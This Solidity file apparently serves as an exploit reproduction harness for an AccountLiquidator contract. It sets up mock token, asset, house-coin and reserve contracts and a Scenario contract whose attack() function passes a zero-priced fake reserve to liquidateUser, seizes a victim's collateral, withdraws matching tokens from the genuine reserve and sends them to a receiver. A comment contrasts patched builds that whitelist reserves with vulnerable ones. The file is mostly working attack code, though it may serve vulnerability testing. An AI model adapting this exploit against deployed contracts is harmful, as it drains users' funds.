// Deterministic local world for the verified Xocolatl AccountLiquidator source.
pragma solidity 0.8.17;
import {AccountLiquidator} from "./AccountLiquidator.sol";

contract MockToken {
    string public name = "Reserve"; string public symbol = "RSV"; uint8 public decimals8 = 18;
    mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance;
    function decimals() external view returns(uint256){return decimals8;}
    function mint(address to,uint256 a) external {balanceOf[to]+=a;}
    function burn(address from,uint256 a) external {require(balanceOf[from]>=a); balanceOf[from]-=a;}
    function approve(address s,uint256 a) external returns(bool){allowance[msg.sender][s]=a;return true;}
    function transfer(address to,uint256 a) external returns(bool){require(balanceOf[msg.sender]>=a);balanceOf[msg.sender]-=a;balanceOf[to]+=a;return true;}
    function transferFrom(address f,address t,uint256 a) external returns(bool){require(balanceOf[f]>=a && allowance[f][msg.sender]>=a);allowance[f][msg.sender]-=a;balanceOf[f]-=a;balanceOf[t]+=a;return true;}
}
contract MockAssets {
    mapping(uint256=>mapping(address=>uint256)) public bal;
    function balanceOf(address a,uint256 id) external view returns(uint256){return bal[id][a];}
    function safeTransferFrom(address f,address t,uint256 id,uint256 a,bytes calldata) external {require(bal[id][f]>=a);bal[id][f]-=a;bal[id][t]+=a;}
    function burn(address a,uint256 id,uint256 a_) external {require(bal[id][a]>=a_);bal[id][a]-=a_;}
    function mint(address a,uint256 id,uint256 a_) external {bal[id][a]+=a_;}
}
contract MockHouseCoin {
    address public backedAsset; constructor(address a){backedAsset=a;}
    function computeUserHealthRatio(address,address) external pure returns(uint256){return 0;}
    function getLiqParams() external pure returns(uint256,uint256,uint256,uint256){return (1,1,0,1e18);}
}
contract MockReserve {
    address public reserveAsset; address public backedAsset; uint256 public reserveTokenID; uint256 public backedTokenID; uint256 public price;
    constructor(address a,address b,uint256 r,uint256 d,uint256 p){reserveAsset=a;backedAsset=b;reserveTokenID=r;backedTokenID=d;price=p;}
    function HOUSE_TYPE() external pure returns(bytes32){return "RESERVE";}
    function maxLTVFactor() external pure returns(uint256){return 1e18;}
    function liquidationFactor() external pure returns(uint256){return 1e18;}
    function getLatestPrice() external view returns(uint256){return price;}
    function reserveMintFee() external pure returns(uint256){return 0;}
    function deposit(uint256) external {}
    function withdraw(uint256 amount) external {MockToken(reserveAsset).transfer(msg.sender,amount);}
}
contract Scenario {
    MockToken public token; MockAssets public assets; MockHouseCoin public house; AccountLiquidator public liquidator; MockReserve public realReserve; MockReserve public fakeReserve;
    address public victim; uint256 public constant RID=11; uint256 public constant DID=12;
    constructor() {
        token=new MockToken(); assets=new MockAssets(); house=new MockHouseCoin(address(token));
        AccountLiquidator implementation = new AccountLiquidator();
        SimpleProxy proxy = new SimpleProxy(address(implementation), abi.encodeWithSignature("initialize(address,address)", address(house), address(assets)));
        liquidator=AccountLiquidator(address(proxy));
        realReserve=new MockReserve(address(token),address(token),RID,DID,1e8);
        fakeReserve=new MockReserve(address(token),address(token),RID,DID,0);
        victim=address(0x1000000000000000000000000000000000000001);
        token.mint(address(realReserve),1000 ether); token.approve(address(liquidator),type(uint256).max);
        assets.mint(victim,RID,100 ether); assets.mint(victim,DID,0);
        // Patched builds accept only the genuine reserve. Vulnerable builds have no setter.
        address(liquidator).call(abi.encodeWithSignature("setApprovedReserve(address,bool)",address(realReserve),true));
    }
    function attack(address payable receiver) external {
        liquidator.liquidateUser(victim,address(fakeReserve));
        uint256 seized=assets.bal(RID,address(this));
        realReserve.withdraw(seized);
        token.transfer(receiver, seized);
    }
    function victimCollateral() external view returns(uint256){return assets.bal(RID,victim);}
    function reserveBalance() external view returns(uint256){return token.balanceOf(address(realReserve));}
    function asset() external view returns(address){return address(token);}
}

contract SimpleProxy {
    address public immutable implementation;
    constructor(address implementation_, bytes memory init) {
        implementation = implementation_;
        (bool ok, bytes memory ret) = implementation_.delegatecall(init);
        if (!ok) assembly { revert(add(ret, 32), mload(ret)) }
    }
    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let ok := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch ok case 0 { revert(0, returndatasize()) } default { return(0, returndatasize()) }
        }
    }
    receive() external payable {}
}
